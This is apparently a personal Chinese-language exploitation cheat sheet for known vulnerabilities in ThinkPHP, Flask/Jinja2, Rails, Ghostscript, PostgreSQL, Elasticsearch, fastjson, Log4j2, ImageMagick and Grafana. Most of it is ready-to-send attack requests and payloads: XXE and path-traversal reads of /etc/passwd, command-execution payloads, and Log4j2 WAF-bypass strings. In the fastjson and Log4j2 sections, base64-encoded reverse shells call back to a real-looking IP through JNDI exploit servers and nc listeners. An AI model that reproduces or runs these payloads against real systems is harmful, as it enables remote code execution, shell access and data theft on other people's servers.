# Real



- [PHP](#PHP)
    - [XXE](XXE)
    - [thinkphp](#thinkphp)
        - [ThinkPHP5-5.0.22/5.1.29-远程代码执行漏洞](#ThinkPHP5-5.0.22/5.1.29-远程代码执行漏洞)
        - [ThinkPHP-5.0.23-Rce](#ThinkPHP-5.0.23-Rce)
        - [ThinkPHP-2.x-任意代码执行漏洞](#ThinkPHP-2.x-任意代码执行漏洞)
    - [phpmyadmin](#phpmyadmin)
- [Python](#Python)
    - [Flask](#Flask)
        - [Jinja2](#Jinja2)
    - [Django](#Django)
- [Struts2](#Struts2)
    - [s2-013](#s2-013)
    - [s2-045](#s2-045)
- [Ruby](#Ruby)
    - [Rails](#Rails)
        - [CVE-2019-5418](#CVE-2019-5418)
- [PostScript](#PostScript)
    - [Ghostscript](#Ghostscript)
        - [CVE-2018-16509](#CVE-2018-16509)
- [数据库](#数据库)
    - [Postgres](#Postgres)
        - [CVE-2019-9193](#CVE-2019-9193)
- [搜索引擎](#搜索引擎)
    - [Elasticsearch](#Elasticsearch)
        - [CVE-2014-3120](#CVE-2014-3120)
        - [CVE-2015-1427](#CVE-2015-1427)
        - [CVE-2015-3337](#CVE-2015-3337)

- [Imagetragick](#Imagetragick)
    - [CVE-2016–3714](#CVE-2016–3714)

- [fastjson](#fastjson)
    - [漏洞扫描/探测](#漏洞扫描/探测)
    - [1.2.24-rce](#1.2.24-rce)
    - [1.2.47-rce](#1.2.47-rce)

- [log4j2](#log4j2)
    - [CVE-2021-44228-log4j2-rce漏洞](#CVE-2021-44228-log4j2-rce漏洞)

- [Grafana](#Grafana)
    - [Grafana插件模块目录穿越漏洞](#Grafana插件模块目录穿越漏洞)


> 以下环境均来自Vulhub

https://github.com/vulhub/vulhub
## PHP

### XXE

Libxml2.9.0 以后 ，默认不解析外部实体，对于PHP版本不影响XXE的利用
`dom.php`、`SimpleXMLElement.php`、`simplexml_load_string.php`均可触发XXE漏洞

```
/dom.php
/SimpleXMLElement.php
/simplexml_load_string.php
```

```
POST /dom.php HTTP/1.1

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<name>&xxe;</name>
</root>
```

![image](./img/php-xxe.png)

### thinkphp

#### ThinkPHP5-5.0.22/5.1.29-远程代码执行漏洞

```
http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
```

或者工具一把梭

#### ThinkPHP-5.0.23-Rce

```bash
POST /index.php?s=captcha HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
```

#### ThinkPHP-2.x-任意代码执行漏洞

```
http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D
```


## Python
### Flask
#### Jinja2

Flask（Jinja2） 服务端模板注入漏洞

```
http://your-ip:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22env%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D
```

在popen输入要执行的命令

env:打印环境变量
id:

### Django

#### 

## Struts2

### s2-013
### s2-045


## Ruby

### Rails

Ruby on Rails是一个 Web 应用程序框架,是一个相对较新的 Web 应用程序框架，构建在 Ruby 语言之上。

#### CVE-2019-5418

漏洞影响：
Ruby on Rails < 6.0.0.beta3
Ruby on Rails < 5.2.2.1
Ruby on Rails < 5.1.6.2
Ruby on Rails < 5.0.7.2

```
GET /robots HTTP/1.1
Host: your-ip:3000
Accept-Encoding: gzip, deflate
Accept: ../../../../../../../../etc/passwd{{
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
```
![image](./img/1.png)
## PostScript

### Ghostscript
#### CVE-2018-16509

需要上传的poc.png
```
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id > /tmp/success && cat /tmp/success) currentdevice putdeviceprops
```

![image](./img/postscript1.png)


## 数据库

### Postgres

#### CVE-2019-9193

Navicat连接数据库，数据库初始账号密码为postgres/postgres

影响版本：PostgreSQL 9.3-11.2
poc
```
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

![image](./img/postgres1.png)

## 搜索引擎

### Elasticsearch

#### CVE-2014-3120

老版本ElasticSearch支持传入动态脚本（MVEL）来执行一些复杂的操作，而MVEL可执行Java代码，而且没有沙盒，所以我们可以直接执行任意代码。

首先，该漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据：

```
POST /website/blog/ HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

{
  "name": "phithon"
}
```

![image](./img/cve-2014-3120-1.png)

执行任意代码
```
POST /_search?pretty HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 343

{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
}
```
![image](./img/cve-2014-3120-2.png)

#### CVE-2015-1427

ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞（CVE-2015-1427）

由于查询时至少要求es中有一条数据，所以发送如下数据包，增加一个数据：


```
POST /website/blog/ HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

{
  "name": "test"
}
```

![image](./img/cve-2015-1427-1.png)

然后发送包含payload的数据包，执行任意命令：
```
POST /_search?pretty HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/text
Content-Length: 156

{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
```

![image](./img/cve-2015-1427-2.png)

#### CVE-2015-3337

在安装了具有“site”功能的插件以后，插件目录使用../即可向上跳转，导致目录穿越漏洞，可读取任意文件。没有安装任意插件的elasticsearch不受影响。

影响版本：1.4.5以下/1.5.2以下

http://node4.buuoj.cn:25305/_plugin/head/

可以看到前端的一种插件

以下不要在浏览器访问
```
GET /_plugin/head/../../../../../../../../../etc/passwd HTTP/1.1
Host: node4.buuoj.cn:25305
....
```


![image](./img/cve-2015-3337.png)

## Imagetragick

ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。但近来有研究者发现，当用户传入一个包含『畸形内容』的图片的时候，就有可能触发命令注入漏洞。

### CVE-2016–3714
## fastjson

Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。

### 漏洞扫描/探测



https://github.com/pmiaowu/BurpFastJsonScan

晚点研究下
### 1.2.24-rce

方法同理1.2.27，payload不一样

```
{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://evil.com:9999/TouchFile",
        "autoCommit":true
    }
}
```

### 1.2.27-rce

影响版本：fastjson <= 1.2.47

**JNDI注入**

相关工具：https://github.com/welk1n/JNDI-Injection-Exploit

反弹shell需要先编码成base64 java可识别的

在线java编码网站：[java.lang.Runtime.exec() Payload Workarounds](https://www.jackson-t.ca/runtime-exec-payloads.html)

如：`sh -i >& /dev/tcp/1.117.51.253/8888 0>&1`需要先拖进去编码

首先要启动一个 RMI 或者 LDAP 服务：在VPS上执行
```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "<payload>" -A <vps>
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy41MS4yNTMvODg4OCAwPiYx}|{base64,-d}|{bash,-i}" -A 1.117.51.253
```

![image](./img/fastjson2.png)

监听8888端口:

```
nc -lvnp 8888
```

目标站点抓包发送如下payload，header需要添加POST的`Content-Type: application/json`
```
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://1.117.51.253:1389/yomh4h",
        "autoCommit":true
    }
}
```
![image](./img/fastjson1.png)

![image](./img/fastjson3.png)



## Log4j2

Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。。 在大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。攻击者利用此特性可通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。

### CVE-2021-44228-log4j2-rce漏洞

Log4j2反弹shell

影响版本：all log4j-core versions >=2.0-beta9 and <=2.14.1


sh -i >& /dev/tcp/10.30.1.49/7777 0>&1

需要拿去base64编码链接如下

https://www.jackson-t.ca/runtime-exec-payloads.html

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAuMzAuMS40OS83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}" -A 10.30.1.49



![image](./img/log4j2-1.png)

`nc -lvnp 7777`


```
POST /hello HTTP/1.1
Host: vulfocus.fofa.so:30484
Content-Type: application/x-www-form-urlencoded

payload="${jndi:rmi://1.117.51.253:1099/pnlvzg}"
```

![image](./img/log4j2-2.png)


tomcat回显方法：
- 参考文章：https://zone.huoxian.cn/d/729-log4j2

```
POST /api/ HTTP/1.1
Host: xxxxx:6631
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
cmd:whoami
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

data=${jndi:ldap://xxxx:1389/Basic/TomcatEcho}
```

`java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 0.0.0.0 -p 9190`

反弹shell：
`data=${jndi:ldap://xxxxx:1389/Basic/ReverseShell/xxxx/5551}`

其它dnslog payload：
```
c=${jndi:ldap://xxx.dnslog.cn}
```

Bypass WAF
```
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
${jndi:rmi://adsasd.asdasd.asdasd}
${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
```

探测工具bp插件：
- https://github.com/whwlsfb/Log4j2Scan
- https://github.com/f0ng/log4j2burpscanner
- [log4j2漏洞快速轻量级检测](https://github.com/test502git/log4j-fuzz-head-poc)

图形化测试工具：https://github.com/nice0e3/log4j_POC

## Grafana

Grafana是一个开源的度量分析与可视化套件。

```
POST / HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymdcbmdQR1sDse9Et
Content-Length: 328

------WebKitFormBoundarymdcbmdQR1sDse9Et
Content-Disposition: form-data; name="file_upload"; filename="1.gif"
Content-Type: image/png

push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oops.jpg"|curl "1.117.51.253:8889)'
pop graphic-context
------WebKitFormBoundarymdcbmdQR1sDse9Et--
```


${jndi:ldap://sl3i3t.dnslog.cn/exp}
### Grafana插件模块目录穿越漏洞

Grafana 8.x 插件模块目录穿越漏洞

这个漏洞出现在插件模块中，这个模块支持用户访问插件目录下的文件，但因为没有对文件名进行限制，攻击者可以利用../的方式穿越目录，读取到服务器上的任意文件。

利用这个漏洞前，我们需要先获取到一个已安装的插件id，比如常见的有：

```
alertlist
cloudwatch
dashlist
elasticsearch
graph
graphite
heatmap
influxdb
mysql
opentsdb
pluginlist
postgres
prometheus
stackdriver
table
text
```

再发送如下数据包，读取任意文件（你也可以将其中的alertlist换成其他合法的插件id）：
```
GET /public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: 192.168.1.112:3000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Connection: close
```

![image](./img/grafana2.png)

![image](./img/grafana1.png)
